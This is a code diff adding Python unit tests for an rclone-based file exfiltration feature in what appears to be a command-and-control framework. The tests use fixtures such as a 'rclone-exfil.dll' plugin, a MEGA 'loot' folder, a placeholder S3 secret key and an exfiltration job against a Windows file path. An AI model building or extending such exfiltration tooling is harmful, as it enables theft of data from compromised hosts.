@@ -5,13 +5,14 @@ import os
 from pathlib import Path
 import tempfile
 import unittest
-from unittest.mock import patch
+from unittest.mock import MagicMock, patch
 
 from rmm_cli import RmmApiClient
+from rmm_rclone import RcloneConfigError
 from rmm_workspace import WorkspaceEventBroker, WorkspaceRegistry, valid_workspace_id
 from rmm_socks import SocksManager
 from rmm_tools import make_client
-from workspace_service import WorkspaceStore
+from workspace_service import WorkspaceService, WorkspaceStore
 
 
 class WorkspaceControlPlaneTests(unittest.TestCase):
@@ -224,6 +225,82 @@ class WorkspaceStoreTests(unittest.TestCase):
 
         self.assertTrue(ok)
         self.assertFalse(artifact.exists())
+
+
+class WorkspaceRcloneTests(unittest.TestCase):
+    """Verify rclone profiles and job construction stay in the workspace."""
+
+    def make_service(self, capabilities):
+        service = WorkspaceService.__new__(WorkspaceService)
+        service.upstream = MagicMock()
+        service.upstream.request.return_value = (200, capabilities, "application/json")
+        return service
+
+    def test_workspace_config_merges_local_profiles_with_central_capabilities(self):
+        service = self.make_service(
+            {
+                "rclone_binary": False,
+                "rclone_plugin": {"name": "rclone-exfil.dll"},
+            }
+        )
+        with patch.dict(
+            os.environ,
+            {
+                "RMM_RCLONE_PROFILES": '{"local":{"type":"mega","folder":"loot"}}',
+                "RMM_RCLONE_PROFILES_FILE": "",
+                "RMM_RCLONE_DEFAULT_PROFILE": "local",
+                "RMM_RCLONE_MAX_BYTES": "0",
+            },
+            clear=False,
+        ):
+            config = service._rclone_config()
+
+        self.assertTrue(config["workspace_local"])
+        self.assertEqual(config["profiles_scope"], "workspace")
+        self.assertEqual(config["profiles"][0]["name"], "local")
+        self.assertEqual(config["default_profile"], "local")
+        self.assertFalse(config["rclone_binary"])
+        self.assertEqual(config["rclone_plugin"]["name"], "rclone-exfil.dll")
+
+    def test_workspace_builds_plugin_job_without_server_profile_lookup(self):
+        service = self.make_service(
+            {
+                "rclone_binary": False,
+                "rclone_plugin": {"name": "rclone-exfil.dll"},
+            }
+        )
+        session = {"agent_type": "go", "capabilities": ["pe"]}
+        with patch.dict(
+            os.environ,
+            {
+                "RMM_RCLONE_PROFILES": '{"local":{"type":"s3","secret_access_key":"secret"}}',
+                "RMM_RCLONE_PROFILES_FILE": "",
+            },
+            clear=False,
+        ):
+            job, _config = service._workspace_exfil_job(
+                session, "C:/Temp/report.txt", "local", None, "auto"
+            )
+
+        self.assertIn("plugin_job", job)
+        self.assertNotIn("binary_payload", job)
+        self.assertEqual(job["plugin_job"]["settings"]["secret_access_key"], "secret")
+
+    def test_workspace_binary_mode_requires_central_bootstrap_capability(self):
+        service = self.make_service({"rclone_binary": False, "rclone_plugin": None})
+        session = {"agent_type": "powershell", "capabilities": []}
+        with patch.dict(
+            os.environ,
+            {
+                "RMM_RCLONE_PROFILES": '{"local":{"type":"s3"}}',
+                "RMM_RCLONE_PROFILES_FILE": "",
+            },
+            clear=False,
+        ):
+            with self.assertRaisesRegex(RcloneConfigError, "bootstrap"):
+                service._workspace_exfil_job(
+                    session, "C:/Temp/report.txt", "local", None, "binary"
+                )
 
 
 class ExternalSocksBridgeTests(unittest.TestCase):
